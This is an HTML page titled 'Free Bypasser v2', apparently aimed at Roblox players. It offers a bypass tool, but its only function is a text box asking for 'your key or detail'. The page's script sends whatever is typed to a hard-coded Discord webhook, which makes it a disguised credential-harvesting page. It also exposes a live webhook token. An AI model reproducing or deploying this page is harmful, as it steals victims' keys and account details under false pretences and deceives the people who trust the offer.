<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Free Bypasser v2</title>
  <style>
    body {
      background-color: #000;
      color: #fff;
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    header {
      width: 100%;
      padding: 20px;
      text-align: center;
      background-color: #111;
      font-size: 1.5rem;
      font-weight: bold;
      border-bottom: 2px solid #444;
    }

    main {
      padding: 30px;
      max-width: 500px;
      width: 100%;
    }

    label {
      display: block;
      margin-bottom: 10px;
      font-size: 1.1rem;
    }

    input[type="text"] {
      width: 100%;
      padding: 10px;
      font-size: 1rem;
      background-color: #222;
      color: #fff;
      border: 1px solid #555;
      border-radius: 5px;
      margin-bottom: 20px;
    }

    button {
      background-color: #fff;
      color: #000;
      border: none;
      padding: 12px 20px;
      font-size: 1rem;
      border-radius: 5px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    button:hover {
      background-color: #ddd;
    }

    footer {
      margin-top: 40px;
      text-align: center;
      font-size: 0.9rem;
      color: #888;
    }
  </style>
</head>
<body>
  <header>Free Bypasser v2</header>
  <main>
    <label for="key">Enter Your Key or Detail Below:</label>
    <input type="text" id="key" placeholder="Your Key or Info Here..." />
    <button onclick="sendToDiscord()">Submit</button>
  </main>
  <footer>
    &copy; 2025 rblxbypas. All rights reserved.
  </footer>

  <script>
    function sendToDiscord() {
      const key = document.getElementById("key").value;
      if (!key) {
        alert("Please enter a key or detail first.");
        return;
      }

      fetch("https://discord.com/api/webhooks/1360655005677518954/6_mMva0TJgBWjlzCDKHyMCz1Moyd-N_H4LIMHpFx9oSyk3GCqalRk5gjftKgBneff_g4", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          content: `New submission: ${key}`
        })
      })
      .then(response => {
        if (response.ok) {
          alert("Submitted successfully!");
          document.getElementById("key").value = "";
        } else {
          alert("Error sending data.");
        }
      })
      .catch(err => {
        alert("Something went wrong.");
        console.error(err);
      });
    }
  </script>
</body>
</html>
